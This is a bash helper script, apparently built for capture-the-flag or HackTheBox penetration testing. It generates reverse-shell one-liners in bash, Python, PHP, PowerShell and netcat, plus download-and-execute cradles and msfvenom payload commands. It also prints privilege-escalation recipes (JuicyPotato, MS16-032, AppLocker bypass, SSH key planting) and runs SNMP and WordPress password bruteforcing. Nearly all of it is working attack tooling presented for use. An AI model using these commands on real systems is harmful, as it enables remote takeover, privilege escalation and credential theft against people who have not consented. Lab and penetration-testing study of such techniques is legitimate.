#!/bin/bash

# local variables

declare ip_addr=""
declare device_name=""  

# ----------------------------------------------------
# functions
# ----------------------------------------------------
function display_revshell
{       
    local os=$1
    local port=$2    
    
    get_ip_address

    [ -z "${port}" ] && port=${local_port}

    echo_blue "*****************************************************************************************"
    echo_blue "             ${ip_addr} [[ ${device_name} ]]                                             "
    echo_blue "*****************************************************************************************"

    local bash_shell="bash -c 'bash -i >& /dev/tcp/${ip_addr}/${port} 0>&1'"
    
    if [ -z "${os}" ] || [ "${os}" == "lin" ];
    then
        # web
        echo_yellow "[*] Wget"
        echo "wget -q -O- http://${ip_addr}:${port}/rev.sh | bash"
        echo

        # bash
        echo_yellow "[*] BASH"
        echo "${bash_shell}"
        echo

        # python
        echo_yellow "[*] PYTHON"
        python_shell="-c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${ip_addr}\",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

        echo "python ${python_shell}"
        echo "python3 ${python_shell}"
        echo

        # php
        echo_yellow "[*] PHP"
        echo "<?php system(\"${bash_shell}\") ?>"
        echo
    fi

    if [ -z "${os}" ] || [ "${os}" == "win" ];
    then
        # powershell
        echo_yellow "[*] Powershell + Windows base64 Encoded command"

        local command="powershell iex(New-Object System.Net.WebClient).DownloadString('http://${ip_addr}:${webserver_port}/rev.ps1')"
        local base64_command=`echo "${command}" | iconv --to-code UTF-16LE | base64 -w 0`

        echo "powershell iex(New-Object System.Net.WebClient).DownloadString('http://${ip_addr}:${webserver_port}/rev.ps1')"
        echo "powershell curl http://${ip_addr}:${webserver_port}/rev.ps1 -o rev.ps1; powershell ./rev.ps1"
        echo "powershell -enc ${base64_command}"    
        echo "powershell (new-object System.Net.WebClient).DownloadFile('http://${ip_addr}:${webserver_port}/nc64.exe','C:\temp\nc64.exe')"
        echo

        # single enum script
        echo_yellow "[*] Windows Single Enumeration & Privesc script"
        echo "powershell iex(New-Object System.Net.WebClient).DownloadString('http://${ip_addr}:${webserver_port}/${single_enum_privesc_script_windows}')"
        echo "powershell (new-object System.Net.WebClient).DownloadFile('http://${ip_addr}:${webserver_port}/${single_enum_privesc_script_windows}', 'C:\\temp\\${single_enum_privesc_script_windows}')"
        echo ""

        # netcat - windows
        echo_yellow "[*] Netcat - Windows"  
        echo "c:\\temp\\nc64.exe -e powershell ${ip_addr} ${port}"
        echo
    fi  
}

function dns_enum
{
    if [ $# -ne 1 ];
    then
        echo "dns_enum <hostname>"
        echo "- <hostname> has to be defined in /etc/hosts"

        return 1
    fi

    local hostname=$1
    echo "running DNS recon for host '${hostname}'..."

    # get ip address from /etc/hosts
    local ip_addr=$(cat /etc/hosts | grep -ie "\s${hostname}\s" | awk '{print $1}')
    echo "resolved ip address '${ip_addr}'"

    if [ -z "${ip_addr}" ];
    then
      echo "could not resolve hostname '${hostname}' to ip address"
      echo "you may need to add a record to /etc/hosts file"
      return 1
    fi

    exec_wrapper nslookup localhost "${hostname}" 
	exec_wrapper nslookup 127.0.0.1 "${hostname}" 
	exec_wrapper nslookup "${hostname}" "${hostname}" 
		
	exec_wrapper dig axfr "${hostname}"  "@${hostname}" 	# zone transfer
	exec_wrapper dig -x "${ip_addr}" "@${ip_addr}"	# reverse lookup 
	exec_wrapper dig -x "${hostname}"  "@${hostname}" 	# reverse lookup 
}

function echo_color
{
    declare color=$1
    shift
    declare arg="$@"

    echo "${color}${arg}${FG_COLOR_RESET}"
}

function echo_blue
{
    echo_color "${FG_COLOR_BLUE}" "$@"
}

function echo_green
{
    echo_color "${FG_COLOR_GREEN}" "$@"
}

function echo_magenta
{
    echo_color "${FG_COLOR_MAGENTA}" "$@"
}

function echo_red
{
    echo_color "${FG_COLOR_RED}" "$@"
}

function echo_yellow
{
    echo_color "${FG_COLOR_YELLOW}" "$@"
}

function exec_wrapper
{
    local cmd="$@"
    echo_green "[*] ------------------------------------------------------------------------------------"
    echo_green "[*] running: '$cmd'"
    echo_green "[*] ------------------------------------------------------------------------------------"
    eval "$cmd"
}

function gobuster_dir
{
    local url=$1
    shift
    IFS='://'
    read -a schema_arr <<< "${url}"
    insecuressl=''
    [ "${#schema_arr[0]}" == "https" ] && insecuressl=' -k '

    exec_wrapper gobuster dir "${insecuressl}" -d -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "$@"
}

function get_ip_address
{
    declare devices_base="/sys/class/net"     
    declare devices=("tun0" "eth0" "eth1")

    for device in "${devices[@]}"
    do
        if [ -d "${devices_base}/${device}" ];
        then
            # set the ip_addr global
            ip_addr="$(ifconfig ${device} | grep 'inet ' | awk {'print $2'})"
            device_name="${device}"

            break;
        fi
    done
}

function helper_commands_banner
{
    echo_blue "*****************************************************************************************"
    echo_blue "              HELPER COMMANDS"
    echo_blue "*****************************************************************************************"
}

function powershell_encoded_command
{
    local command=$1

    local cmd="echo "${command}" | iconv --to-code UTF-16LE | base64 -w 0"
    echo "${cmd}"
    local command_base64=`eval "${cmd}"`

    echo "powershell -enc ${command_base64}"
}

function privilege_escalation_banner
{
    os=$1

    echo_magenta "*****************************************************************************************"
    echo_magenta "              PRIVILEGE ESCALATION - ${os}"
    echo_magenta "*****************************************************************************************"
}

function privilege_escalation_linux
{   
    privilege_escalation_banner "Linux"

    get_ip_address

    echo_yellow "[*] General commands"
    echo "uname -a"
	echo "id; groups"
	echo "sudo -l"
    echo "SUID / SGID files"
    echo "processes"
    echo "netstat"
    echo "backups / configs"
    echo ""

    echo_yellow "[*] Enumeration scripts"
    echo "wget -q -O- ${ip_addr}:${webserver_port}/${single_enum_privesc_script_linux} | bash"
	echo "run linpeas"
    echo "run linEnum"
	echo "run linux exploit suggester"
	echo ""	

    echo_yellow "[*] Kernel exploits"
    echo "wget -r ${ip_addr}:${webserver_port}"
    echo "wget ${ip_addr}:${webserver_port}/kernel/lucky0_64; chmod +x lucky0_64; while :; do ./lucky0_64 -q && break; done"				

    echo_yellow "[*] Other"	
    echo "run pspy"
}

function privilege_escalation_windows
{
    privilege_escalation_banner "Windows"

    local port=$1
    [ -z "${port}" ] && port=${local_port}
    
    # get the ip address, will be saved to a global variable ip_addr
    get_ip_address

    echo_yellow "[*] Reverse shells"
    echo "powershell iex(New-Object System.Net.WebClient).DownloadString('http://${ip_addr}:${webserver_port}/rev.ps1')"
    echo "powershell curl http://${ip_addr}:${webserver_port}/rev.ps1 -o rev.ps1; powershell ./rev.ps1"
    echo "powershell -enc ${base64_command}"
    echo "powershell (new-object System.Net.WebClient).DownloadFile('http://${ip_addr}:${webserver_port}/nc64.exe','C:\temp\nc64.exe')"
    echo "c:\\temp\\nc64.exe -e powershell ${ip_addr} ${local_port}"

    # general
    echo_yellow "[*} General"
    echo "whoami /all"
    echo "net users"
    echo "net groups"
    echo "systeminfo"
    echo "processes"
    echo "configs / passwords / backups"
    echo "netstat"
    echo "kernel exploits"
    echo "gci -force -recurse . | select fullname" 
    echo "gci -force -recurse c:\users\. | select fullname" 
    echo "TODO: - find .bat, .ps1"  
    echo ""

    echo_yellow "[*] Single Enum & Privesc Script"
    echo "powershell iex(New-Object System.Net.WebClient).DownloadString('http://${ip_addr}:${webserver_port}/single-enum-privesc.ps1')"
    echo ""

    # alternate data streams
    echo_yellow "[*] Alternate Data Streams"
    echo "Get-Item -path .\hello.txt -stream *	// show ADS
Get-Content -path .\hello.txt -stream hidden  // get content"
    echo ""

    # access rights
    echo_yellow "[*] ICACLS - access rights"
    echo "icacls c:\temp\file.txt"

    # crypted files
    echo_yellow "[*] Cipher /c"
    echo "cipher /c file.txt"

    # saved creds
    echo_yellow "[*] Saved credentials"
    echo "runas /user:Administrator /savecred \"nc64.exe -e cmd.exe ${ip_addr} ${local_port}\" "
	echo ""

    # Applocker bypass
    echo_yellow "[*] Applocker bypass"
    echo 'C:\Windows\Tasks' 
    echo 'C:\Windows\Temp' 
    echo 'C:\Windows\System32\spool\PRINTERS'
    echo 'C:\Windows\System32\spool\SERVERS'
    echo 'C:\Windows\System32\spool\drivers\color'
    echo 'C:\Windows\SysWOW64\FxsTmp'
    echo 'C:\Windows\SysWOW64\com\dmp'

    # UAC bypass
    echo_yellow "[*] UAC Bypass - need Administrators group"
    echo "net use z:\ 127.0.0.1\c$ && cd z:\users\administrator\desktop"

    echo_yellow "[*] Powershell constraint mode bypass"
	echo "powershell -version 2"

    # get .net versions
    echo_yellow "[*] Get .NET versions"
    echo 'get-item c:\windows\microsoft.net\framework64\...\clr.dll | fl  // FileVersion'


    # Powershell remoting
    echo ""
    echo_yellow "[*] Powershell Remoting"
    echo "\$securePassword = ConvertTo-SecureString 'passw0rd' -AsPlainText -Force
\$credential = New-Object System.Management.Automation.PSCredential 'hostname\user', \$securePassword
\$sess = New-PSSession -Credential \$credential -ComputerName localhost
Enter-PSSession \$sess
<Run commands in remote session>
Exit-PSSession
Remove-PSSession \$sess
"
    echo_yellow "[*] Enum scripts"    
    # winPEAS
    echo "(new-object System.Net.WebClient).DownloadFile(\"http://${ip_addr}:${webserver_port}/winPEAS.exe\", 'C:\temp\winpeas.exe'); C:\\temp\\winpeas.exe"
    # jaws
    echo "iex(New-Object System.Net.WebClient).DownloadString(\"http://${ip_addr}:${webserver_port}/jaws-enum.ps1\")"
    # sherlock
    echo "iex(New-Object System.Net.WebClient).DownloadString(\"http://${ip_addr}:${webserver_port}/Sherlock.ps1\");Find-AllVulns"
    # powerup
    echo "iex(New-Object System.Net.WebClient).DownloadString(\"http://${ip_addr}:${webserver_port}/PowerUp.ps1\");Invoke-AllChecks"
    echo ""

    # download & run potato attack
    echo_yellow "[*] *Potato* attack"    
    echo "msfvenom --platform windows -p windows/x86/shell_reverse_tcp LHOST=${ip_addr} LPORT=${port} -f exe -o rev32.exe"
    echo "msfvenom --platform windows -p windows/x64/shell_reverse_tcp LHOST=${ip_addr} LPORT=${port} -f exe -o rev64.exe"
    echo "powershell (new-object System.Net.WebClient).DownloadFile('http://${ip_addr}:${webserver_port}/JuicyPotato.exe','C:\temp\jp.exe')"    
    echo "powershell (new-object System.Net.WebClient).DownloadFile('http://${ip_addr}:${webserver_port}/rev64.exe','C:\temp\rev64.exe')"
    echo "c:\\temp\\jp.exe -l 1337 -t * -p rev64.exe"
    echo "c:\\temp\\jp.exe -l 1337 -t * -p rev64.exe -c '{4991d34b-80a1-4291-83b6-3328366b9097}'"
    echo "CLSID list = https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md"
    echo ""

    # other attacks
    # MS16-032
    echo_yellow "[*] MS16-032"    
    echo "run: ncw ${port}"
    echo "iex(New-Object System.Net.WebClient).DownloadString('http://${ip_addr}:${webserver_port}/Invoke-MS16032.ps1'); Invoke-MS16032 -Command \"iex(New-Object Net.WebClient).DownloadString('${ip_addr}:${webserver_port}/rev.ps1')\""
    echo ""
}

function shell_listen_linux
{
    # display also revshells
    display_revshell "lin"

    local port=$1
    [ -z "${port}" ] && port=${local_port}       

    helper_commands_banner    
    
    get_ip_address

    echo "wget -r ${ip_addr}:${webserver_port}"

    local public_ssh_key=`cat "${public_ssh_key}"`
    
    echo ""
    echo_yellow "[*] Linux Single Enum & Privesc script"
    echo "wget -q -O- ${ip_addr}:${webserver_port}/${single_enum_privesc_script_linux}  | bash"
    echo ""

    echo_yellow "[*] Add SSH key"
    echo "mkdir ~/.ssh/ 2>/dev/null; echo '${public_ssh_key}' >> ~/.ssh/authorized_keys"
    echo ""

    echo_yellow "[*] General commands"
    echo "id" 
    echo "groups" 
    echo "sudo -l" 
    echo "find / -type f -writable -ls 2>/dev/null"
    echo ""

    exec_wrapper pwncat -lp $port
}

function shell_listen_windows
{
    # display also revshells
    display_revshell "win"

    local port=$1
    [ -z "${port}" ] && port=${local_port}
       
    helper_commands_banner

    #echo_yellow "[*] SMB connect to server"
    #echo "net use W: \\\\${ip_addr}\\${smb_server_share_name} /USER:${smb_user} '${smb_password}'; net use"    

    #echo ""
    #echo "
#\$securePassword = ConvertTo-SecureString '${smb_password}' -AsPlainText -Force
#\$credential = New-Object System.Management.Automation.PSCredential '${smb_user}', \$securePassword
#New-PSDrive -Name \"W\" -Root \"\\\\${ip_addr}\\${smb_server_share_name}\\\"  -PSProvider \"FileSystem\" -Credential \$credential
#"      

    echo ""
    echo_yellow "[*] General commands"
    echo "systeminfo" 
    echo "whoami /all" 
    echo "gci -force -recurse . | select fullname" 
    echo "gci -force -recurse c:\users\. | select fullname" 
    echo "TODO: - find .bat, .ps1"  
    echo ""    

    exec_wrapper rlwrap nc -lvnp "$port"
}

function snmp_enum
{
    # argument is ip address
    if [ $# -ne 1 ];
    then
        echo "snmp_enum <ip address>"

        return 1
    fi

    local host=$1
    
    # snmp version 2
    exec_wrapper snmpwalk -c public -v2c "${host}"

    # snmp check
    exec_wrapper snmp-check	"${host}"
 
    # community string bruteforce
    exec_wrapper onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt "${host}"
}

function ssh_with_htb_key
{
    exec_wrapper ssh -i "'${private_ssh_key}'" "$@"
}

function scp_with_htb_key
{
    exec_wrapper scp -i "'${private_ssh_key}'" "$@"
}

function tty_upgrade
{
    echo "${space}python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
    echo "${space}python -c 'import pty;pty.spawn(\"/bin/bash\")'"
    echo "${space}script -qc /bin/bash /dev/null"
    echo 
    echo "${space}stty raw -echo"
    echo "${space}export TERM=xterm-color256"
    echo "${space}stty rows 52 columns 235"
}

function update
{
    
    local saved_pwd=`pwd`

    # updates all the tools...
    exec_wrapper sudo searchsploit -u
    exec_wrapper wpscan --update

    for tool in "${ctf_framework_third_party_tools[@]}";
    do
        exec_wrapper "cd /opt/${tool} && sudo git pull"
    done    

    cd "${saved_pwd}"
}

function wordpress_enum_plugins_gobuster
{
    exec_wrapper gobuster dir  -w /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt -u "$@"
}

function wordpress_scan_all
{    
    if [ $# -ne 1 ];
    then
        echo "wordpress_scan_all <host>"

        return 1
    fi

    local host=$1
    
    exec_wrapper wpscan --disable-tls-checks --url "${host}" --api-token "${wpscan_token}" --no-update -e vp,vt,tt,cb,dbe,u1-1000,m --plugins-version-detection aggressive -f cli-no-color 2>&1 | tee wpscan_passive.txt    
    exec_wrapper wpscan --disable-tls-checks --url "${host}" --api-token "${wpscan_token}" --no-update -e vp,vt,tt,cb,dbe,u1-1000,m --detection-mode aggressive --plugins-detection aggressive --plugins-version-detection aggressive --themes-detection aggressive --config-backups-detection aggressive --db-exports-detection aggressive --users-detection aggressive -f cli-no-color 2>&1 | tee wpscan_aggressive.txt    
    exec_wrapper gobuster dir -w /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt -u "${host}"     
    exec_wrapper wfuzz --hc 404 -f wpscan-posts-enum.txt -z range,1-100 "${host}/?p=FUZZ"
}

function wordpress_bruteforce
{    
    if [ $# -ne 2 ];
    then
        echo "wordpress_bruteforce <host> <userfile>"

        return 1
    fi

    local host=$1
    local user_file=$2

    exec_wrapper wpscan --force --random-user-agent --api-token "${wpscan_token}" --usernames "${user_file}" --passwords /usr/share/seclists/Passwords/darkweb2017-top1000.txt --url "${host}"   | tee  wpscan-bruteforce.log 
}


